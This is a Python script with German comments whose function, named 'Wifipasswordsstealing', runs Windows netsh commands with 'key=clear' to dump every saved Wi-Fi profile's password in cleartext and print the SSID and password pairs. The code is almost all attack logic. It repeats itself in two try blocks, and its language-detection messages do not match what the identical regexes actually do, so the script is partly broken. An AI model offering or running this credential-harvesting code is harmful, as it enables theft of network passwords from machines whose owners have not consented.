from msilib.schema import File
import re
import subprocess

def Wifipasswordsstealing():
    try:
        # In Python können wir Systembefehle ausführen, indem wir eine Funktion verwenden, die vom Modul subprocess bereitgestellt wird (subprocess.run(<Liste der Befehlszeilenargumente geht hierhin>, <Angabe des zweiten Arguments, wenn Sie die Ausgabe aufzeichnen möchten>))

        # Das Skript ist ein übergeordneter Prozess und erzeugt einen untergeordneten Prozess, der den Systembefehl ausführt und erst weiterläuft, wenn der untergeordnete Prozess beendet ist.

        # Um den Inhalt zu speichern, der an den Standardausgabestrom (das Terminal) gesendet wird, müssen wir angeben, dass wir die Ausgabe erfassen wollen, also geben wir als zweites Argument capture_output = True an. Diese Information wird im stdout-Attribut gespeichert. Die Informationen werden in Bytes gespeichert und müssen in Unicode dekodiert werden, bevor sie als String in Python verwendet werden können.

        command_output = subprocess.run(
            ["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()

        # Wir haben das Modul re importiert, damit wir reguläre Ausdrücke verwenden können. Wir wollen alle Wifi-Namen finden, die immer nach "ALL User Profile :" aufgeführt sind. Im regulären Ausdruck erstellen wir eine Gruppe aus allen Zeichen, bis die Return-Escape-Sequenz (\r) erscheint.

        profile_names = (re.findall(
            "All User Profile     : (.*)\r", command_output))

        # Wir erstellen eine leere Liste außerhalb der Schleife, in der Wörterbücher mit allen WLAN-Benutzernamen und Passwörtern gespeichert werden.

        wifi_list = list()

        # Wenn wir keine Profilnamen gefunden haben, haben wir keine WLAN-Verbindungen, also führen wir nur den Teil aus, um die Details des WLANs zu prüfen und ob wir in diesem Teil ihre Passwörter bekommen können.

        if len(profile_names) != 0:
            for name in profile_names:
                # Jede WLAN-Verbindung benötigt ihr eigenes Wörterbuch, das an die wifi_list angehängt wird.
                wifi_profile = dict()
                # Wir führen jetzt einen spezifischeren Befehl aus, um die Informationen über die spezifische WLAN-Verbindung zu sehen, und wenn der Sicherheitsschlüssel nicht fehlt, können wir möglicherweise das Passwort erhalten.
                profile_info = subprocess.run(
                    ["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
                # Wir verwenden einen regulären Ausdruck, um nur nach den fehlenden Fällen zu suchen, damit wir sie ignorieren können.
                if re.search("Security key           : Absent", profile_info):
                    continue
                else:
                    # Weisen Sie die ssid des WiFi-Profils dem Wörterbuch zu.
                    wifi_profile["ssid"] = name
                    # Diese Fälle sind nicht abwesend und wir sollten sie ausführen "key=clear" Befehlsteil, um das Passwort zu erhalten
                    profile_info_pass = subprocess.run(
                        ["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
                    # Führen Sie erneut die regulären Ausdrücke aus, um die Gruppe nach dem : zu erfassen, die das Passwort ist
                    password = re.search(
                        "Key Content            : (.*)\r", profile_info_pass)
                    # Prüfen Sie, ob wir ein Passwort im regulären Ausdruck gefunden haben. Alle WLAN-Verbindungen werden keine Passwörter haben.
                    if password == None:
                        wifi_profile["password"] = None
                    else:
                        # Wir weisen die Gruppierung (in der das Kennwort enthalten ist), die uns interessiert, dem Kennwortschlüssel im Wörterbuch zu.
                        wifi_profile["password"] = password[1]
                    # Wir hängen die Wifi-Informationen an die wifi_list an.
                    wifi_list.append(wifi_profile)

        # Print die Ergebnisse
        print("Hier die Daten: ")
        for item in wifi_list:
            print(f"SSID: {item['ssid']}, Password: {item['password']}\n")

    except:
        print("It is not a German Language based System")

    try:
        command_output = subprocess.run(
            ["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()

        profile_names = (re.findall(
            "All User Profile     : (.*)\r", command_output))

        wifi_list = list()

        if len(profile_names) != 0:
            for name in profile_names:

                wifi_profile = dict()

                profile_info = subprocess.run(
                    ["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()

                if re.search("Security key           : Absent", profile_info):
                    continue
                else:

                    wifi_profile["ssid"] = name

                    profile_info_pass = subprocess.run(
                        ["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()

                    password = re.search(
                        "Key Content            : (.*)\r", profile_info_pass)

                    if password == None:
                        wifi_profile["password"] = None
                    else:

                        wifi_profile["password"] = password[1]

                    wifi_list.append(wifi_profile)

        print("Hier die Daten: ")
        for item in wifi_list:
            print(f"SSID: {item['ssid']}, Password: {item['password']}\n")

    except:
        print("It is not a English Language based System")